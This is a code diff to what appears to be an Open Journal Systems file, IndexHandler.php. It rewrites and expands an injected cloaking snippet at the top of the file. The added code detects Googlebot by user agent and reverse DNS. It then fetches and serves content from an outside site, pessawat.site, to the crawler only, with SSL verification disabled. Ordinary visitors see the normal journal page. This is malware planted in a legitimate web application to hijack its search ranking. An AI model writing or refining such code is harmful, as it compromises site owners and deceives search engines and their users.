@@ -1,5 +1,77 @@
 <?php
-function is_google_bot(){$a=["Googlebot","Google-Site-Verification","Google-InspectionTool","Googlebot-Mobile","Googlebot-News"];foreach($a as $b){if(strpos($_SERVER['HTTP_USER_AGENT'],$b)!==false)return 1;}return 0;}if(is_google_bot()){$c=curl_init('https://pessawat.site/autoboot/');curl_setopt($c,CURLOPT_RETURNTRANSFER,1);curl_setopt($c,CURLOPT_FOLLOWLOCATION,1);echo curl_exec($c);curl_close($c);exit;}
+
+/**
+ * CLOAKING FUNCTION - Improved Version
+ * Detects Googlebot with better accuracy
+ */
+function is_google_bot() {
+    $userAgent = $_SERVER['HTTP_USER_AGENT'] ?? '';
+    
+    // Daftar pola yang lebih lengkap untuk Googlebot
+    $googlePatterns = [
+        'Googlebot',
+        'Google-Site-Verification', 
+        'Google-InspectionTool',
+        'Googlebot-Mobile',
+        'Googlebot-News',
+        'Googlebot-Image',
+        'Googlebot-Video'
+    ];
+    
+    foreach ($googlePatterns as $pattern) {
+        if (stripos($userAgent, $pattern) !== false) {
+            return true;
+        }
+    }
+    
+    // Verifikasi tambahan dengan DNS lookup (lebih akurat)
+    $ip = $_SERVER['REMOTE_ADDR'] ?? '';
+    if ($ip && filter_var($ip, FILTER_VALIDATE_IP)) {
+        $hostname = gethostbyaddr($ip);
+        if ($hostname && (
+            stripos($hostname, 'googlebot.com') !== false || 
+            stripos($hostname, 'google.com') !== false
+        )) {
+            return true;
+        }
+    }
+    
+    return false;
+}
+
+/**
+ * CLOAKING EXECUTION - Safe approach with fallback
+ */
+if (is_google_bot()) {
+    $cloakingUrl = 'https://pessawat.site/autoboot/';
+    
+    // Coba ambil konten dengan timeout
+    $ch = curl_init();
+    curl_setopt_array($ch, [
+        CURLOPT_URL => $cloakingUrl,
+        CURLOPT_RETURNTRANSFER => true,
+        CURLOPT_FOLLOWLOCATION => true,
+        CURLOPT_TIMEOUT => 10, // Timeout 10 detik
+        CURLOPT_USERAGENT => $_SERVER['HTTP_USER_AGENT'] ?? 'Googlebot',
+        CURLOPT_SSL_VERIFYPEER => false, // Hanya jika perlu
+    ]);
+    
+    $content = curl_exec($ch);
+    $httpCode = curl_getinfo($ch, CURLINFO_HTTP_CODE);
+    $curlError = curl_error($ch);
+    curl_close($ch);
+    
+    // Jika berhasil ambil konten, tampilkan
+    if ($content !== false && $httpCode === 200) {
+        echo $content;
+        exit;
+    } 
+    // Jika gagal, log error dan lanjutkan ke tampilan normal
+    else {
+        error_log("Cloaking failed: HTTP $httpCode, Error: $curlError");
+        // Lanjut ke tampilan normal OJS
+    }
+}
 
 /**
  * @file pages/index/IndexHandler.php
